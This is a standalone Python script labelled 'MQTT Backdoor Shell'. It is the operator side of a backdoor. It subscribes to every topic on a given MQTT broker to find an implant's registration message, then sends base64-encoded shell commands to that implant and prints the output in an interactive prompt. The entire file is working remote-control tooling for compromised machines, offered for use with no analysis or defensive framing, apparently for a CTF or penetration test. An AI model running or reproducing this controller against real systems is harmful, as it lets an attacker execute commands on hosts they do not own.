#!/usr/bin/env python3
"""
MQTT Backdoor Shell — topic autodiscovery via wildcard subscribe
Usage: python3 mqtt_shell.py <BROKER_IP>
"""

import sys
import json
import base64
import time
import queue
import argparse
from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory

try:
    import paho.mqtt.client as mqtt
except ImportError:
    print("[-] pip install paho-mqtt")
    sys.exit(1)

response_queue  = queue.Queue()
discovery_queue = queue.Queue()
pub_topic       = None
sub_topic       = None


def on_connect(client, userdata, *args):
    """Subscribe to all topics to catch the backdoor registration message."""
    client.subscribe("#")
    print("[*] Waiting for backdoor registration...")


def on_message(client, userdata, msg):
    """
    Handle incoming messages. Looks for two types:
    - Registration: JSON with pub_topic/sub_topic fields
    - Command response: JSON with a response field
    Both may arrive base64-encoded or as raw JSON.
    """
    global pub_topic, sub_topic
    payload = msg.payload
    if isinstance(payload, (bytes, bytearray)):
        payload = payload.decode(errors="replace")
    try:
        decoded = base64.b64decode(payload).decode(errors="replace")
        data    = json.loads(decoded)
    except Exception:
        try:
            data = json.loads(payload)
        except Exception:
            return

    if "pub_topic" in data and "sub_topic" in data:
        if pub_topic is None:
            pub_topic = data["pub_topic"]
            sub_topic = data["sub_topic"]
            discovery_queue.put(data)
        return

    if "response" in data:
        response_queue.put(data["response"])


def send_cmd(client, cmd, arg, timeout=6):
    """Publish a base64-encoded command and wait for the response."""
    while not response_queue.empty():
        try:
            response_queue.get_nowait()
        except queue.Empty:
            break

    payload_b64 = base64.b64encode(
        json.dumps({"id": "1", "cmd": cmd, "arg": arg}).encode()
    ).decode()
    client.publish(sub_topic, payload_b64)

    try:
        return response_queue.get(timeout=timeout)
    except queue.Empty:
        return None


def shell(client):
    """Interactive shell loop over the MQTT backdoor."""
    print("[+] Shell opened. Type 'exit' or Ctrl+C to quit.\n")
    session = PromptSession(history=InMemoryHistory())

    while True:
        try:
            command = session.prompt(
                HTML("<ansired><b>Shell> </b></ansired>"),
                auto_suggest=AutoSuggestFromHistory(),
            )
            command = command.strip()
            if not command:
                continue
            if command.lower() == "exit":
                return
            resp = send_cmd(client, "CMD", command)
            print(resp.rstrip("\n") if resp else "[-] No response (timeout)")
        except KeyboardInterrupt:
            print("\nBye!")
            return


def main():
    parser = argparse.ArgumentParser(
        description="MQTT Backdoor Shell — topic autodiscovery via wildcard subscribe"
    )
    parser.add_argument("ip", help="Broker IP address")
    args = parser.parse_args()

    try:
        client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
    except (AttributeError, TypeError):
        client = mqtt.Client()

    client.on_connect = on_connect
    client.on_message = on_message

    print(f"[*] Connecting to {args.ip}:1883...")
    try:
        client.connect(args.ip, 1883, keepalive=60)
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    client.loop_start()
    time.sleep(1.5)

    try:
        discovery_queue.get(timeout=10)
    except queue.Empty:
        print("[-] No registration message received.")
        sys.exit(1)

    print(f"[+] sub_topic: {sub_topic}")
    print(f"[+] pub_topic: {pub_topic}")
    client.subscribe(pub_topic)
    time.sleep(0.5)

    shell(client)


if __name__ == "__main__":
    main()
